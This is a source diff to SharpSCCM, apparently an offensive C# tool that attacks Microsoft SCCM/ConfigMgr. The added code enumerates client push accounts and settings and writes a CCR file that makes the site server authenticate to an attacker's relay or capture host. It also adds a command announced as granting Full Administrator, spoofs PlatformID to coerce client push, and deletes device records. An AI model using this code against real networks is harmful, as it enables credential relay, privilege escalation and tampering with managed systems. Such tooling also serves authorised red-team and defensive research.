@@ -15,8 +15,6 @@ using System.Xml;
 using Microsoft.ConfigurationManagement.Messaging.Framework;
 using Microsoft.ConfigurationManagement.Messaging.Messages;
 using Microsoft.ConfigurationManagement.Messaging.Sender.Http;
-//using Microsoft.ConfigurationManagement.ApplicationManagement;
-//using Microsoft.ConfigurationManagement.ApplicationManagement.Serialization;
 
 namespace SharpSCCM
 {
@@ -66,7 +64,7 @@ namespace SharpSCCM
             ManagementBaseObject generatorParams = collectionClass.GetMethodParameters("GenerateCCRByName");
             generatorParams.SetPropertyValue("Name", target);
             generatorParams.SetPropertyValue("PushSiteCode", sitecode);
-            generatorParams.SetPropertyValue("Forced", true);
+            generatorParams.SetPropertyValue("Forced", false);
             collectionClass.InvokeMethod("GenerateCCRByName", generatorParams, null);
         }
 
@@ -90,8 +88,6 @@ namespace SharpSCCM
 
         static void GetNetworkAccessAccounts(string server, string sitecode)
         {
-
-
             // HTTP sender is used for sending messages to the MP
             HttpSender sender = new HttpSender();
 
@@ -183,6 +179,70 @@ namespace SharpSCCM
             }
         }
 
+        static void GetSitePushSettings(string server, string sitecode)
+        {
+            ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery($"SELECT PropertyName, Value, Value1 FROM SMS_SCI_SCProperty WHERE ItemType='SMS_DISCOVERY_DATA_MANAGER' AND (PropertyName='ENABLEKERBEROSCHECK' OR PropertyName='FILTERS' OR PropertyName='SETTINGS')"));
+            ManagementObjectCollection results = searcher.Get();
+            foreach (ManagementObject result in results)
+            {
+                if (result["PropertyName"].ToString() == "SETTINGS" && result["Value1"].ToString() == "Active")
+                {
+                    Console.WriteLine("[+] Automatic site-wide client push installation is enabled");
+                }
+                else if (result["PropertyName"].ToString() == "ENABLEKERBEROSCHECK" && result["Value"].ToString() == "3")
+                { 
+                    Console.WriteLine("[+] Fallback to NTLM is enabled");
+                }
+                else if (result["PropertyName"].ToString() == "FILTERS")
+                {
+                    Console.WriteLine("[+] Install client software on the following computers:");
+                    if (result["Value"].ToString() == "0")
+                    {
+                        Console.WriteLine("  Workstations and Servers (including domain controllers)");
+                    }
+                    else if (result["Value"].ToString() == "1")
+                    {
+                        Console.WriteLine("  Servers only (including domain controllers)");
+                    }
+                    else if (result["Value"].ToString() == "2")
+                    {
+                        Console.WriteLine("  Workstations and Servers (excluding domain controllers)");
+                    }
+                    else if (result["Value"].ToString() == "3")
+                    {
+                        Console.WriteLine("  Servers only (excluding domain controllers)");
+                    }
+                    else if (result["Value"].ToString() == "4")
+                    {
+                        Console.WriteLine("  Workstations and domain controllers only (excluding other servers)");
+                    }
+                    else if (result["Value"].ToString() == "5")
+                    {
+                        Console.WriteLine("  Domain controllers only");
+                    }
+                    else if (result["Value"].ToString() == "6")
+                    {
+                        Console.WriteLine("  Workstations only");
+                    }
+                    else if (result["Value"].ToString() == "7")
+                    {
+                        Console.WriteLine("  No computers");
+                    }
+                }
+            }
+            searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery($"SELECT Values FROM SMS_SCI_SCPropertyList WHERE PropertyListName='Reserved2'"));
+            results = searcher.Get();
+            foreach (ManagementObject result in results)
+            {
+                foreach (string value in (string[])result["Values"])
+                {
+                    Console.WriteLine($"[+] Discovered client push installation account: {value}");
+
+                }
+            }
+        }
+
         static SmsClientId GetSmsId()
         {
             ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm");
@@ -211,6 +271,24 @@ namespace SharpSCCM
             clientOperation.InvokeMethod("InitiateClientOperation", initiateClientOpParams, null);
         }
 
+        static void LocalGrepFile(string path, string stringToFind)
+        {
+            string[] lines = System.IO.File.ReadAllLines(path);
+            foreach (string line in lines)
+            {
+                if (line.Contains(stringToFind))
+                {
+                    Console.WriteLine(line);
+                }
+            }
+        }
+
+        static void LocalPushLogs(string startTime, string startDate)
+        {
+            ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\cimv2");
+            DateTime startDateObj = DateTime.Parse(startDate);
+        }
+
         static void LocalNetworkAccessAccounts()
         {
             ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm\\policy\\Machine\\ActualConfig");
@@ -229,7 +307,7 @@ namespace SharpSCCM
                     try
                     {
                         
-                        Dpapi.Execute(protectedUsername);
+                        //Dpapi.Execute(protectedUsername);
                         //// Decrypt the data in memory. The result is stored in the same array as the original data.
                         //ProtectedMemory.Unprotect(protectedUsernameBytes, MemoryProtectionScope.SameLogon);
                         //Console.WriteLine(System.Text.Encoding.Default.GetString(protectedUsernameBytes));
@@ -601,6 +679,24 @@ namespace SharpSCCM
             }
         }
 
+        static void RemoveDevice(ManagementScope scope, string guid)
+        {
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_R_SYSTEM WHERE SMSUniqueIdentifier='{guid}'"));
+            ManagementObjectCollection devices = searcher.Get();
+            if (devices.Count > 0)
+            {
+                foreach (ManagementObject device in devices)
+                {
+                    device.Delete();
+                    Console.WriteLine($"[+] Deleted device with SMSUniqueIdentifier {guid}");
+                }
+            }
+            else
+            {
+                Console.WriteLine($"[+] Found {devices.Count} devices with SMSUniqueIdentifier {guid}");
+            }
+        }
+
         // Utility Functions
         static void InvokeQuery(ManagementScope scope, string query)
         {
@@ -917,10 +1013,10 @@ namespace SharpSCCM
             // Add dummy root element to appease XmlDocument parser
             inventoryXmlDoc.LoadXml("<root>" + inventoryReportXml + "</root>");
             // Replace OperatingSystemVersion special attribute (a.k.a. PlatformID) with Windows Workstation to coerce client push installation
-            XmlNode platformId = inventoryXmlDoc.SelectSingleNode("//PlatformID");
-            Console.WriteLine($"[+] Discovered PlatformID: {platformId.InnerXml}");
-            platformId.InnerText = "Microsoft Windows NT Workstation 2010.0";
-            Console.WriteLine($"[+] Modified PlatformID: {platformId.InnerXml}");
+            XmlNode platformIdNode = inventoryXmlDoc.SelectSingleNode("//PlatformID");
+            Console.WriteLine($"[+] Discovered PlatformID: {platformIdNode.InnerXml}");
+            platformIdNode.InnerText = "Microsoft Windows NT Workstation 2010.0";
+            Console.WriteLine($"[+] Modified PlatformID: {platformIdNode.InnerXml}");
             // Replace original FQDN with supplied one
             XmlNode fqdnNode = inventoryXmlDoc.SelectSingleNode("//FQDN");
             fqdnNode.InnerText = target;
@@ -980,6 +1076,17 @@ namespace SharpSCCM
                 {
                     ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                     AddUserToCollection(sccmConnection, userName, collectionName);
+                });
+
+            // add user-to-admins
+            var addUserToAdmins = new Command("user-to-admins", "Add a user to the RBAC_Admins table to obtain Full Administrator access to ConfigMgr console and WMI objects. This command requires local Administrator privileges on the server running the site database.");
+            addCommand.Add(addUserToAdmins);
+            addUserToAdmins.Add(new Argument<string>("user-name", "The domain and user name you would like to grant Full Administrator privilege to (e.g., DOMAIN-SHORTNAME\\USERNAME)"));
+            addUserToAdmins.Handler = CommandHandler.Create(
+                (string server, string sitecode, string userName) =>
+                {
+                    var connection = Database.Connect(server, sitecode);
+                    Database.Query(connection, "SELECT * FROM RBAC_Admins");
                 });
 
             // get 
@@ -1116,7 +1223,7 @@ namespace SharpSCCM
             // get device
             var getDevice = new Command("device", "Get information on devices");
             getCommand.Add(getDevice);
-            getDevice.Add(new Option<string>(new[] { "--last-user", "-u" }, "Get information on devices where a specific user was the last to log in (matches exact string provided)"));
+            getDevice.Add(new Option<string>(new[] { "--last-user", "-u" }, "Get information on devices where a specific user was the last to log in (matches exact string provided). Note: This reflects the last user logon at the point in time the last heartbeat DDR and hardware inventory was sent to the management point and may not be accurate."));
             getDevice.Add(new Option<string>(new[] { "--name", "-n" }, "A string to search for in device names (returns all devices where the device name contains the provided string"));
             getDevice.Handler = CommandHandler.Create(
                 (string server, string sitecode, bool count, bool dryRun, string orderBy, string[] properties, string whereCondition, bool verbose, string lastUser, string name) =>
@@ -1131,7 +1238,7 @@ namespace SharpSCCM
                     }
                     if (properties.Length == 0 && !verbose)
                     {
-                        properties = new[] { "Active", "ADSiteName", "Client", "DistinguishedName", "FullDomainName", "HardwareID", "IPAddresses", "IPSubnets", "IPv6Addresses", "IPv6Prefixes", "IsVirtualMachine", "LastLogonTimeStamp", "LastLogonUserDomain", "LastLogonUserName", "MACAddresses", "Name", "NetbiosName", "Obsolete", "OperatingSystemNameandVersion", "PrimaryGroupID", "ResourceDomainORWorkgroup", "ResourceNames", "SID", "SMSInstalledSites", "SMSUniqueIdentifier", "SNMPCommunityName", "SystemContainerName", "SystemGroupName", "SystemOUName" };
+                        properties = new[] { "Active", "ADSiteName", "Client", "DistinguishedName", "FullDomainName", "HardwareID", "IPAddresses", "IPSubnets", "IPv6Addresses", "IPv6Prefixes", "IsVirtualMachine", "LastLogontimeStamp", "LastLogonUserDomain", "LastLogonUserName", "MACAddresses", "Name", "NetbiosName", "Obsolete", "OperatingSystemNameandVersion", "PrimaryGroupID", "ResourceDomainORWorkgroup", "ResourceNames", "SID", "SMSInstalledSites", "SMSUniqueIdentifier", "SNMPCommunityName", "SystemContainerName", "SystemGroupName", "SystemOUName" };
                     }
                     ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                     GetClassInstances(sccmConnection, "SMS_R_System", count, properties, whereCondition, orderBy, dryRun, verbose);
@@ -1169,6 +1276,15 @@ namespace SharpSCCM
                     }
                     ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                     GetClassInstances(sccmConnection, "SMS_UserMachineRelationShip", count, properties, whereCondition, orderBy, dryRun, verbose);
+                });
+
+            // get site-push-settings
+            var getSitePushSettings = new Command("site-push-settings", "Query the specified management point for automatic client push installation settings (requires Full Administrator access)");
+            getCommand.Add(getSitePushSettings);
+            getSitePushSettings.Handler = CommandHandler.Create(
+                (string server, string sitecode) =>
+                {
+                    GetSitePushSettings(server, sitecode);
                 });
 
             // invoke
@@ -1258,6 +1374,36 @@ namespace SharpSCCM
                     ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm");
                     GetClassInstances(sccmConnection, "CCM_InstalledComponent", false, new[] { "Version" }, "Name='SmsClient'");
                 }));
+
+            // local create-ccr
+            var localCreateCCR = new Command("create-ccr", "Create a CCR that initiates client push installation to a specified target (requires local Administrator privileges on a management point, only works on ConfigMgr 2003 and 2007)");
+            localCommand.Add(localCreateCCR);
+            localCreateCCR.Add(new Argument<string>("target", "The NetBIOS name, IP address, or if WebClient is enabled on the site server, the IP address and port (e.g., 192.168.1.1@8080) of the relay/capture server. The server will attempt to authenticate to the ADMIN$ share on this target."));
+            localCreateCCR.Handler = CommandHandler.Create(
+                (string target) =>
+                {
+                    string[] lines = { "[NT Client Configuration Request]", $"Machine Name={target}" };
+                    System.IO.File.WriteAllLines("C:\\Program Files\\Microsoft Configuration Manager\\inboxes\\ccr.box\\test.ccr", lines);
+                });
+
+            // local push-logs
+            var localPushLogs = new Command("push-logs", "Search for evidence of client push installation");
+            localCommand.Add(localPushLogs);
+            localPushLogs.Handler = CommandHandler.Create(
+                new Action(() =>
+                { 
+                    //LocalPushLogs();
+                }));
+
+            // local grep
+            var localGrep = new Command("grep", "Search a specified file for a specified string");
+            localCommand.Add(localGrep);
+            localGrep.Add(new Argument<string>("path", "The full path to the file (e.g., \"C:\\Windows\\ccmsetup\\Logs\\ccmsetup.log"));
+            localGrep.Add(new Argument<string>("string-to-find", "The string to search for"));
+            localGrep.Handler = CommandHandler.Create(
+                (string path, string stringToFind) =>
+                    LocalGrepFile(path, stringToFind)
+                );
 
             // local naa
             var getLocalNetworkAccessAccounts = new Command("naa", "Get any network access accounts for the site");
@@ -1370,10 +1516,20 @@ namespace SharpSCCM
                     RemoveDeployment(sccmConnection, application, collection);
                 });
 
+            // remove device
+            var removeDevice = new Command("device", "Remove a device from SCCM");
+            removeCommand.Add(removeDevice);
+            removeDevice.Add(new Argument<string>("guid", "The GUID of the device to remove (e.g., \"GUID:AB424B0D-F582-4020-AA26-71D32EA07683\""));
+            removeDevice.Handler = CommandHandler.Create(
+                (string server, string sitecode, string guid) =>
+                {
+                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    RemoveDevice(sccmConnection, guid);
+                });
+
             // Execute
             var commandLine = new CommandLineBuilder(rootCommand).UseDefaults().Build();
             commandLine.Invoke(args);
-            //rootCommand.Invoke(args);
         }
     }
 }
